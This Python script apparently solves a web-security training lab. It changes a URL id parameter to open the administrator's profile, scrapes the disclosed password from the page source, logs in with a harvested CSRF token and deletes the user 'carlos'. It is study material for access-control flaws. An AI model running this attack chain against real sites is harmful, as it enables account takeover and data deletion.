####################################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 5/9/2023
#
# Lab: User ID controlled by request parameter with password disclosure
#
# Steps: 1. Fetch administrator page via URL id parameter
#        2. Extract the password from source code
#        3. Login as administrator
#        4. Delete carlos
#
#####################################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this url to your lab
url = "https://0a4a00c003b919c1847df99a00b10055.web-security-academy.net"

try:  # fetch administrator profile
    admin_profile = requests.get(
        f"{url}/my-account?id=administrator")
    if admin_profile.status_code == 200:
        print(Fore.WHITE + "1. Fetching administrator profile page.. " +
              Fore.GREEN + "OK")
        # extract the administrator password from source code
        admin_pass = re.findall("name=password value='(.*)'",
                                admin_profile.text)[0]
        print(Fore.WHITE + "2. Extracting password from source code.. " +
              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_pass)
        try:  # fetch login page to get valid session and csrf token
            get_login = requests.get(
                f"{url}/login")
            if get_login.status_code == 200:
                print(
                    Fore.WHITE + "3. Fetching login page to get valid session and csrf token.. " + Fore.GREEN + "OK")
                # extract the session cookie
                session = get_login.cookies.get("session")
                # extract the csrf token
                csrf = re.findall("csrf.+value=\"(.+)\"",
                                  get_login.content.decode())[0]
                try:  # login as administrator
                    data = {
                        "username": "administrator",
                        "password": admin_pass,
                        "csrf": csrf
                    }
                    cookies = {
                        "session": session
                    }
                    login = requests.post(
                        f"{url}/login", data, cookies=cookies, allow_redirects=False)
                    if login.status_code == 302:
                        print(
                            Fore.WHITE + "4. Logging in as administrator.. " + Fore.GREEN + "OK")
                        # extract the new session
                        new_session = login.cookies.get("session")
                        try:  # delete carlos
                            cookies = {"session": new_session}
                            delete_carlos = requests.get(
                                f"{url}/admin/delete?username=carlos", cookies=cookies)
                            if delete_carlos.status_code == 200:
                                print(
                                    Fore.WHITE + "5. Deleting carlos.. " + Fore.GREEN + "OK")
                                print(
                                    Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                            else:
                                print(
                                    Fore.RED + "[!] Failed to delete carlos")
                        except:
                            print(
                                Fore.RED + "[!] Failed to delete carlos through exception")
                    else:
                        print(
                            Fore.RED + "[!] Failed to login as administrator")
                except:
                    print(
                        Fore.RED + "[!] Failed to login as administrator through exception")
            else:
                print(
                    Fore.RED + "[!] Failed to fetch login page")
        except:
            print(
                Fore.RED + "[!] Failed to fetch login page through exception")
    else:
        print(Fore.RED + "[!] Failed to fetch administrator profile")
except:
    print(
        Fore.RED + "[!] Failed to fetch administrator profile through exception")
